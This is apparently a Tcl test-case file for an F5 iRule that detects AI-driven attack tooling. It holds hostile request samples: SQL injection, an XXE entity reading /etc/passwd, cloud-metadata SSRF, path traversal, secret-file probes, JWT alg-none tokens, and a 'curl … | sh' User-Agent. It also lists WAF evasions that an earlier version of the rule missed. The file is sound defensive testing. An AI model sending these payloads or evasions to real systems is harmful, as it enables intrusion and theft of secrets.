# irule_cases.tcl - request cases for f5-irule-agentic.tcl, run by irule_runtime.tcl.
#
# t <name> <request dict> <expected status: pass or 403> <expected rule ids logged>
# Request keys: method, uri, ip, headers {Name value ...}, body, dup {lower-name {v1 v2}}
# (dup models a header sent more than once; "headers" then holds the last value, as F5 returns).
#
# Cases marked "ev:" are evasions the first shipped version of the rule let through.
proc jwt {h} { return "[string trimright [string map {+ - / _} [binary encode base64 $h]] =].e30." }
set static::agt_log_only 0
t "baseline" {} pass {}
t "001 artex-enrich" {headers {User-Agent artex-enrich/1.0}} 403 W-AGT-001
t "001 ArtEx mixed case" {headers {User-Agent "Mozilla/5.0 (compatible; ArtEx/1.0)"}} 403 W-AGT-001
t "001 security-testing" {headers {User-Agent "Mozilla/5.0 (security-testing; authorized)"}} 403 W-AGT-001
t "002 webshell manager" {headers {User-Agent "Mozilla/5.0 (compatible; CyberStrikeAI-WebShell/1.0)"}} 403 {W-AGT-001 W-AGT-002}
t "003 ffuf logged only" {headers {User-Agent "Fuzz Faster U Fool v2.1.0-dev"}} pass W-AGT-003
t "curl allowed" {headers {User-Agent curl/8.5.0}} pass {}
t "empty UA allowed" {headers {User-Agent ""}} pass {}
t "010 listed address" {ip 23.158.220.98} 403 W-AGT-010
t "004 canary path" {uri /zzz-nonexistent-xyz123} 403 W-AGT-004
t "004 canary upper-case" {uri /ZZZ-NONEXISTENT-xyz} 403 W-AGT-004
t "004 canary user in query" {uri /login?user=zz_no_such_user_9f3a} 403 W-AGT-004
t "004 metadata SSRF" {uri /fetch?url=http://169.254.169.254/latest/meta-data/} 403 W-AGT-004
t "004 metadata SSRF encoded" {uri /fetch?url=http%3A%2F%2F169.254.169.254%2F} 403 W-AGT-004
t "004 canary in form body" {method POST uri /login body "username=zzq.nonexistent9x7&password=x"} 403 W-AGT-004
t "004 encoded canary in body" {method POST uri /login body "email=precheck.not-a-user%40example.invalid"} 403 W-AGT-004
t "004 canary in JSON body" {method POST uri /login headers {Content-Type application/json} body "{\"username\":\"zz_no_such_user_9f3a\"}"} 403 W-AGT-004
t "005 jwt none" [list headers [list Authorization "Bearer [jwt {{"alg":"none","typ":"JWT"}}]"]] 403 W-AGT-005
t "005 jwt None typ-first" [list headers [list Authorization "Bearer [jwt {{"typ":"JWT","alg":"None"}}]"]] 403 W-AGT-005
t "005 jwt NONE typ-first" [list headers [list Authorization "Bearer [jwt {{"typ":"JWT","alg":"NONE"}}]"]] 403 W-AGT-005
t "005 jwt RS256 allowed" [list headers [list Authorization "Bearer [jwt {{"alg":"RS256","typ":"JWT"}}]"]] pass {}
t "005 jwt none in cookie" [list headers [list Cookie "session=[jwt {{"alg":"none"}}]"]] 403 W-AGT-005
t "006 sqli union %20" {uri "/search?q=ARTEX'%20UNION%20SELECT%201--"} 403 W-AGT-006
t "006 sqli union +" {uri "/search?q=ARTEX'+UNION+SELECT+1--"} 403 W-AGT-006
t "006 sqli comment-spaced" {uri "/search?q=ARTEX'/**/AND/**/2>1"} 403 W-AGT-006
t "006 sqli + in form body" {method POST uri /search body "q=artex'+or+1%3D1"} 403 W-AGT-006
t "006 prose allowed" {uri "/search?q=the%20artex's%20manual"} pass {}
t "007 probe account in query" {uri "/signup?email=i04probe1792451568%40x.com"} 403 W-AGT-007
t "007 probe account in body" {method POST uri /login body "email=i04probe1792451568%40x.com"} 403 W-AGT-007
t "007 normal email allowed" {method POST uri /login body "email=probe%40x.com"} pass {}
t "008 task artifact" {uri /up/i4028.asp} 403 W-AGT-008
t "008 index.php allowed" {uri /index.php} pass {}
t "008 jsp shell shape" {uri /x/cl1217.jsp} 403 W-AGT-008
t "008 normal jsp allowed" {uri /page2024.jsp} pass {}
t "008 upload artifact" {method POST uri /up headers {Content-Type "multipart/form-data; boundary=x"} body "--x\r\nContent-Disposition: form-data; name=\"file\"; filename=\"i4028.php\"\r\n\r\nx\r\n--x--"} 403 W-AGT-008
t "009 DTD in xml" {method POST uri /saml headers {Content-Type application/xml} body "<?xml version=\"1.0\"?><!DOCTYPE x \[<!ENTITY e SYSTEM \"file:///etc/passwd\">\]><a>&e;</a>"} 403 W-AGT-009
t "009 plain xml allowed" {method POST uri /saml headers {Content-Type application/xml} body "<a>1</a>"} pass {}
t "011 shell in UA" {headers {User-Agent "x \$(id)"}} 403 W-AGT-011
t "011 curl pipe sh" {headers {User-Agent "a; curl http://h/x | sh"}} 403 W-AGT-011
t "011 android UA allowed" {headers {User-Agent "Mozilla/5.0 (Linux; Android 14; SH-51C) AppleWebKit/537.36"}} pass {}
t "012 upload traversal" {method POST uri /up headers {Content-Type "multipart/form-data; boundary=x"} body "--x\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../x.py\"\r\n\r\nx\r\n--x--"} 403 W-AGT-012
t "012 upload sitecustomize" {method POST uri /up headers {Content-Type "multipart/form-data; boundary=x"} body "--x\r\nContent-Disposition: form-data; name=\"file\"; filename=\"sitecustomize.py\"\r\n\r\nx\r\n--x--"} 403 W-AGT-012
t "012 normal upload allowed" {method POST uri /up headers {Content-Type "multipart/form-data; boundary=x"} body "--x\r\nContent-Disposition: form-data; name=\"file\"; filename=\"scan01.nii.gz\"\r\n\r\nx\r\n--x--"} pass {}
t "013 isCliRequest logged" {headers {isCliRequest true}} pass W-AGT-013
t "014 ../ in path" {uri /app/../../etc/passwd} 403 W-AGT-014
t "014 %2e%2e" {uri /app/%2e%2e/%2e%2e/etc/passwd} 403 W-AGT-014
t "014 %2E%2E upper" {uri /app/%2E%2E/x} 403 W-AGT-014
t "014 ..%5c" {uri /app/..%5c..%5cwin.ini} 403 W-AGT-014
t "014 double-encoded" {uri /app/%252e%252e/x} 403 W-AGT-014
t "014 query traversal" {uri /dl?file=../../etc/passwd} 403 W-AGT-014
t "014 encoded query traversal" {uri /dl?file=..%2f..%2fetc%2fpasswd} 403 W-AGT-014
t "014 form body traversal" {method POST uri /dl headers {Content-Type application/x-www-form-urlencoded} body "file=..%2F..%2Fetc%2Fpasswd"} 403 W-AGT-014
t "014 form body backslash" {method POST uri /dl headers {Content-Type application/x-www-form-urlencoded} body "file=..%5C..%5Cwin.ini"} 403 W-AGT-014
t "014 json relative path allowed" {method POST uri /api headers {Content-Type application/json} body "{\"import\":\"../lib/x.js\"}"} pass {}
t "014 dotted filename allowed" {uri /files/report.v2..final.pdf} pass {}
t "014 range allowed" {uri /x?range=1..10} pass {}
t "021 .env" {uri /.env} 403 W-AGT-021
t "021 .env.production" {uri /app/.env.production} 403 W-AGT-021
t "021 .git/config" {uri /.git/config} 403 W-AGT-021
t "021 /.environment-setup is not a secret file" {uri /docs/.environment-setup} pass {}
t "021 actuator/env outside" {uri /actuator/env} 403 W-AGT-021
t "021 actuator/env inside" {uri /actuator/env ip 10.1.2.3} pass {}
t "021 actuator/health open" {uri /actuator/health} pass {}
t "021 actuator/health/liveness open" {uri /actuator/health/liveness} pass {}
t "021 actuator/healthx/../env" {uri /actuator/health/../env} 403 W-AGT-014
t "021 pprof" {uri /debug/pprof/heap} 403 W-AGT-021
t "021 /actuators-catalogue is not a management endpoint" {uri /actuators-catalogue} pass {}
t "020 off by default" {uri /openapi.json} pass {}
set static::agt_block_specs 1
t "020 openapi outside" {uri /openapi.json} 403 W-AGT-020
t "020 swagger-ui outside" {uri /swagger-ui/index.html} 403 W-AGT-020
t "020 js.map outside" {uri /static/app.js.map} 403 W-AGT-020
t "020 openapi inside" {uri /openapi.json ip 192.168.1.9} pass {}
set static::agt_block_specs 0
# body size and transfer encoding
set big [string repeat "a=b&" 20000]
t "body: canary beyond the first 64 KB is not seen (documented limit)" [list method POST uri /login body "${big}username=zz_no_such_user_9f3a"] pass {}
t "body: canary first, then 80 KB padding" [list method POST uri /login body "username=zz_no_such_user_9f3a&$big"] 403 W-AGT-004
t "body: chunked canary" {method POST uri /login headers {Transfer-Encoding chunked} body "username=zz_no_such_user_9f3a"} 403 W-AGT-004
t "body: GET with no body is not collected" {uri /x} pass {}
# evasions
t "ev: /%61ctuator/env" {uri /%61ctuator/env} 403 W-AGT-021
t "ev: /actuator;x/env" {uri "/actuator;x/env"} 403 W-AGT-021
t "ev: health/..;/env" {uri "/actuator/health/..;/env"} 403 W-AGT-014
t "ev: health;a=b/env" {uri "/actuator/health;a=b/env"} 403 W-AGT-021
t "ev: /.%65nv" {uri /.%65nv} 403 W-AGT-021
t "ev: /.git%2fconfig" {uri /.git%2fconfig} 403 W-AGT-021
t "ev: /.gitignore allowed" {uri /.gitignore} pass {}
t "ev: /.github/x allowed" {uri /.github/workflows} pass {}
t "ev: i4028.%70hp" {uri /up/i4028.%70hp} 403 W-AGT-008
t "ev: i4028.php;.jpg" {uri "/up/i4028.php;.jpg"} 403 W-AGT-008
t "ev: i4028.php/x" {uri /up/i4028.php/x} 403 W-AGT-008
t "ev: cl1217.jsp;x" {uri "/x/cl1217.jsp;x=1"} 403 W-AGT-008
t "ev: /app/.%2e/x" {uri /app/.%2e/x} 403 W-AGT-014
t "ev: /app/..;/x" {uri "/app/..;/x"} 403 W-AGT-014
t "ev: text/XML DTD" {method POST uri /saml headers {Content-Type text/XML} body "<!DOCTYPE x \[<!ENTITY e SYSTEM \"file:///etc/passwd\">\]><a/>"} 403 W-AGT-009
t "ev: duplicate User-Agent, hostile one first" {headers {User-Agent "Mozilla/5.0"} dup {user-agent {artex-enrich/1.0 Mozilla/5.0}}} 403 W-AGT-001
t "ev: body starting with -- (multipart)" {method POST uri /up headers {Content-Type "multipart/form-data; boundary=x"} body "--x\r\nContent-Disposition: form-data; name=\"u\"\r\n\r\nzz_no_such_user_1\r\n--x--"} 403 W-AGT-004
t "ev: User-Agent starting with -" {headers {User-Agent "-artex-enrich/1.0"}} 403 W-AGT-001
set static::agt_block_specs 1
t "ev: openapi.json;x outside" {uri "/openapi.json;x=1"} 403 W-AGT-020
set static::agt_block_specs 0
# F5 Labs' appendix: every listed user-agent that carries the framework's name is refused.
set fh [open [file join [file dirname [info script]] f5labs-artex-user-agents.txt]]
set named 0
foreach ua [split [read $fh] "\n"] {
    if {$ua eq "" || [string index $ua 0] eq "#"} continue
    if {![regexp -nocase {(^|[^a-z])artex} $ua]} continue
    incr named
    t "F5 Labs list: $ua" [list headers [list User-Agent $ua]] 403 W-AGT-001
}
close $fh
if {$named != 44} { incr fail; puts "FAIL F5 Labs list: $named name-bearing user-agents, want 44" }
t "a product name that only contains the letters" {headers {User-Agent "SmartExchange/2.1"}} pass {}
# log-only mode
set static::agt_log_only 1
t "log-only: nothing is refused" {headers {User-Agent artex-enrich/1.0}} pass W-AGT-001
t "log-only: body rules still log and release" {method POST uri /login body "username=zzq.nonexistent9x7"} pass W-AGT-004
